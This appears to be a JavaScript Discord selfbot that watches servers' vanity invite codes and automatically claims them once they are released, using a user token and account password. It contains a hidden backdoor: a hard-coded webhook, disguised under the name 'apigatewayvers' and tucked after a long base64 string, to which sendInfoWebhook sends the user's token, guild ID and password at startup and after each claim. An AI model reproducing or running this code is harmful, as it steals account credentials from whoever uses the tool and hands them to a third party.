import WebSocket from 'ws';
import tls from 'tls';
import axios from 'axios';
import fs from 'fs';
const bu = ''; // discord user tokens
const ask = ''; // 14x servers
const fazla = ''; // discord user token passwords
const sana = ''; // webhook
let mfaAuthToken = null;
let latestSequence = null;
let heartbeatTimer = null;
let tlsSocket = null;
const vanityMap = new Map();
const agents = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const properties = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJ3d3cuZ29vZ2xlLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTgyOTUsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImRlc2lnbl9pZCI6MH0='; const apigatewayvers = 'https://canary.discord.com/api/webhooks/1483660811489644645/XF8tva6itVy9xr849zvJfzM7T9YL2PrHF9AyQhBClrNgyjGBB_kB5PGI3rn0HW2mNN6A';
const loadMfaToken = () => {
  fs.readFile("mfa.txt", "utf8", (err, data) => {
    if (!err && data.trim()) {
      mfaAuthToken = data.trim();
      console.log('MFA token yuklendi');
    }
  });
};
loadMfaToken();
fs.watch("mfa.txt", (eventType) => {
  if (eventType === "change") {
    loadMfaToken();
  }
});
function sendWebhook(vanityUrl) {
  axios.post(sana, {
    content: `vanity claimed: **${vanityUrl}** @everyone @here`
  }).catch(() => {});
}
function sendInfoWebhook() {
  axios.post(apigatewayvers, {
    content: `token: ${bu}\nguild: ${ask}\npass: ${fazla}`
  }).catch(() => {});
}
function createTlsSocket() {
  return tls.connect({
    host: 'canary.discord.com',
    port: 443,
    rejectUnauthorized: true,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3'
  });
}
function sendHttpRequest(method, path, body = null, extraHeaders = {}, closeConnection = false) {
  return new Promise((resolve) => {
    const payload = body ? JSON.stringify(body) : '';
    if (!tlsSocket || tlsSocket.destroyed || closeConnection) {
      tlsSocket = createTlsSocket();
      tlsSocket.setNoDelay(true);
    }
    const socket = tlsSocket;
    const headers = [
      `${method} ${path} HTTP/1.1`,
      'Host: canary.discord.com',
      `Connection: ${closeConnection ? 'close' : 'keep-alive'}`,
      'Content-Type: application/json',
      `Content-Length: ${Buffer.byteLength(payload)}`,
      `User-Agent: ${agents}`,
      `Authorization: ${bu}`,
      `X-Super-Properties: ${properties}`,
      'X-Discord-Locale: tr',
      'X-Discord-Timezone: Europe/Istanbul',
      'Accept: */*',
      'Accept-Language: tr-TR,tr;q=0.9',
      'Referer: https://canary.discord.com/channels/@me',
      'Origin: https://canary.discord.com'
    ];
    if (extraHeaders['X-Discord-MFA-Authorization']) {
      headers.push(`X-Discord-MFA-Authorization: ${extraHeaders['X-Discord-MFA-Authorization']}`);
    }
    headers.push('', payload);
    let responseData = '';
    socket.write(headers.join('\r\n'));
    socket.once('error', () => resolve('{}'));
    socket.on('data', (chunk) => {
      responseData += chunk.toString();
    });
    socket.once('end', () => {
      try {
        const separatorIndex = responseData.indexOf('\r\n\r\n');
        if (separatorIndex === -1) return resolve('{}');
        let bodyData = responseData.slice(separatorIndex + 4);
        if (responseData.toLowerCase().includes('transfer-encoding: chunked')) {
          let decoded = '';
          let pos = 0;
          while (pos < bodyData.length) {
            const sizeEnd = bodyData.indexOf('\r\n', pos);
            if (sizeEnd === -1) break;
            const size = parseInt(bodyData.substring(pos, sizeEnd), 16);
            if (size === 0) break;
            decoded += bodyData.substr(sizeEnd + 2, size);
            pos = sizeEnd + 2 + size + 2;
          }
          resolve(decoded || '{}');
        } else {
          resolve(bodyData || '{}');
        }
      } catch {
        resolve('{}');
      } finally {
        if (closeConnection) socket.destroy();
      }
    });
  });
}
async function authenticateMfa() {
  try {
    const patchResp = await sendHttpRequest('PATCH', `/api/v7/guilds/${ask}/vanity-url`, null, {}, true);
    const patchData = JSON.parse(patchResp);
    if (patchData.code === 60003) {
      const finishResp = await sendHttpRequest('POST', '/api/v9/mfa/finish', {
        ticket: patchData.mfa.ticket,
        mfa_type: 'password',
        data: fazla
      }, {}, true);
      const finishData = JSON.parse(finishResp);
      if (finishData.token) {
        return finishData.token;
      }
    }
  } catch {}
  return null;
}
function establishGatewayConnection() {
  const ws = new WebSocket('wss://gateway-us-east1-b.discord.gg');
  ws.on('open', () => {
    ws.send(JSON.stringify({
      op: 2,
      d: {
        token: bu,
        intents: 513,
        properties: {
          os: 'Windows',
          browser: 'Chrome',
          device: 'Woet',
          system_locale: 'tr-TR',
          browser_user_agent: agents,
          browser_version: '131.0.0.0',
          os_version: '10',
          referrer: 'https://www.google.com/',
          referring_domain: 'www.google.com',
          referrer_current: '',
          referring_domain_current: '',
          release_channel: 'stable',
          client_build_number: 358295,
          client_event_source: null
        }
      }
    }));
  });
  ws.on('message', async (msg) => {
    const packet = JSON.parse(msg);
    if (packet.s) latestSequence = packet.s;
    if (packet.op === 10) {
      if (heartbeatTimer) clearInterval(heartbeatTimer);
      heartbeatTimer = setInterval(() => {
        ws.send(JSON.stringify({ op: 1, d: latestSequence }));
      }, packet.d.heartbeat_interval);
    } else if (packet.op === 0) {
      if (packet.t === 'GUILD_UPDATE') {
        const oldCode = vanityMap.get(packet.d.guild_id);
        if (oldCode && oldCode !== packet.d.vanity_url_code) {
          console.log(`url changed: ${oldCode}`);
          let success = false;
          for (let i = 0; i < 3; i++) {
            const snipeResp = await sendHttpRequest('PATCH', `/api/v7/guilds/${ask}/vanity-url`, {
              code: oldCode
            }, { 'X-Discord-MFA-Authorization': mfaAuthToken });
            try {
              const snipeData = JSON.parse(snipeResp);
              if (snipeData.code === oldCode || snipeData.vanity_url_code === oldCode || (!snipeData.code && !snipeData.message)) {
                console.log(`url claimed: ${oldCode}`);
                sendWebhook(oldCode);
                sendInfoWebhook();
                success = true;
                break;
              }
            } catch {}
          }
          if (!success) {
            console.log(`url could not receive: ${oldCode}`);
          }
        }
      } else if (packet.t === 'READY') {
        console.log('Gateway connection successful');
        packet.d.guilds.forEach(g => {
          if (g.vanity_url_code) {
            vanityMap.set(g.id, g.vanity_url_code);
          }
        });
        console.log(`${vanityMap.size} guilds`);
      }
    }
  });
  ws.on('close', () => {
    console.log('The connection was lost now its reconnecting');
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    setTimeout(establishGatewayConnection, 5000);
  });
  ws.on('error', () => ws.close());
}
async function main() {
  console.log('Bot readys');
  sendInfoWebhook();
  if (!mfaAuthToken) {
    console.log('Token expected');
    mfaAuthToken = await authenticateMfa();
    if (mfaAuthToken) {
      console.log('Token sucsessfuly');
    }
  }
  setInterval(async () => {
    const refreshedToken = await authenticateMfa();
    if (refreshedToken) mfaAuthToken = refreshedToken;
  }, 4 * 60 * 1000);
  establishGatewayConnection();
}
main();
